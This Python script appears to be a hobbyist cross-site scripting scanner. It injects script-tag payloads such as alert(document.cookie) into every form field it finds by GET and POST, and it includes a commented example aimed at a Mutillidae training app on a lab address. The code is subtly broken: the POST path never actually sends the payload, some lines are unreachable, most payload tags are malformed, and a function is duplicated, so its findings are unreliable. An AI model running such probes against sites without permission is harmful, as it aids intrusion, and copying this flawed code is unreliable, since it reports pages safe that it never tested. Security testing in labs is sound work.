from random import randint
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import requests


def session():
    r = requests.Session()

    r.headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}

    return r


class core:

    @classmethod
    def generate(self, eff):
        FUNCTION = [
            "prompt(5000/200)",
            "alert(6000/3000)",
            "alert(document.cookie)",
            "prompt(document.cookie)",
            "console.log(5000/3000)"
        ]
        if eff == 1:
            return "<script/>" + FUNCTION[randint(0, 4)] + "<\script\>"

        elif eff == 2:
            return "<\script/>" + FUNCTION[randint(0, 4)] + "<\\script>"

        elif eff == 3:
            return "<\script\> " + FUNCTION[randint(0, 4)] + "<//script>"

        elif eff == 4:
            return "<script>" + FUNCTION[randint(0, 4)] + "<\script/>"

        elif eff == 5:
            return "<script>" + FUNCTION[randint(0, 4)] + "<//script>"

        elif eff == 6:
            return "<script>" + FUNCTION[randint(0, 4)] + "</script>"

    @classmethod
    def post_method(self):
        bsObj = BeautifulSoup(self.body, "html.parser")
        forms = bsObj.find_all("form", method=True)

        for form in forms:
            try:
                action = form["action"]
            except KeyError:
                action = self.url

            if form["method"].lower().strip() == "post":
                print("Target have form with POST method: " + urljoin(self.url, action))
                print("Collecting form input key.....")

                keys = {}
                for key in form.find_all(["input", "textarea"]):
                    try:
                        if key["type"] == "submit":
                            print("Form key name: " + key["name"] + " value: " + "<Submit Confirm>")
                            keys.update({key["name"]: key["name"]})

                        else:
                            print("Form key name: " + key["name"] + " value: " + self.payload)
                            print({key["name"]: self.payload})

                    except Exception as e:
                        print("Internal error: " + str(e))

                print("Sending payload (POST) method...")
                req = self.session.post(urljoin(self.url, action), data=keys)
                if self.payload in req.text:
                    print("Detected XSS (POST) at " + urljoin(self.url, req.url))
                    c=urljoin(self.url, req.url)
                    return c
                    print("Post data: " + str(keys))
                else:
                    print("This page is safe from XSS (POST) attack but not 100% yet...")
                    return

    @classmethod
    def get_method_form(self):
        bsObj = BeautifulSoup(self.body, "html.parser")
        forms = bsObj.find_all("form", method=True)

        for form in forms:
            try:
                action = form["action"]
            except KeyError:
                action = self.url

            if form["method"].lower().strip() == "get":
                print("Target have form with GET method: " + urljoin(self.url, action))
                print("Collecting form input key.....")

                keys = {}
                for key in form.find_all(["input", "textarea"]):
                    try:
                        if key["type"] == "submit":
                            print("Form key name: " + key["name"] + " value: " + "<Submit Confirm>")
                            keys.update({key["name"]: key["name"]})

                        else:
                            print("Form key name: " + key["name"] + " value: " + self.payload)
                            keys.update({key["name"]: self.payload})

                    except Exception as e:
                        print("Internal error: " + str(e))
                        try:
                            print("Form key name: " + key["name"] + " value: " + self.payload)
                            keys.update({key["name"]: self.payload})
                        except KeyError as e:
                            print("Internal error: " + str(e))

                print("Sending payload (GET) method...")
                req = self.session.get(urljoin(self.url, action), params=keys)
                if self.payload in req.text:
                    print("Detected XSS (GET) at " + urljoin(self.url, req.url))
                    c=urljoin(self.url, req.url)
                    return c
                    print("GET data: " + str(keys))
                else:
                    print("This page is safe from XSS (GET) attack but not 100% yet...")
                    return


    @classmethod
    def main(self, url):
        payload = core.generate(6)
        self.payload = payload
        self.url = url

        self.session = session()
        print("Checking connection to: " + url)
        try:
            ctr = self.session.get(url)
            self.body = ctr.text
        except Exception as e:
            print("Internal error: " + str(e))
            return

        if ctr.status_code > 400:
            print("Connection failed " + str(ctr.status_code))
            return
        else:
            print("Connection estabilished " + str(ctr.status_code))
        val=[]
        b=self.post_method()
        if b:
            val.append(b)
        #self.get_method()
        a=self.get_method_form()
        if a:
            val.append(a)
        if len(val):
            return val
        else:
            val.append("This page might be safe  from XSS attack ...")
            return val



def session():
    r = requests.Session()

    r.headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}

    return r

"""""
u = "http://10.0.2.11/mutillidae/index.php?page=user-info.php"

b=core.main(u)
print(b)
"""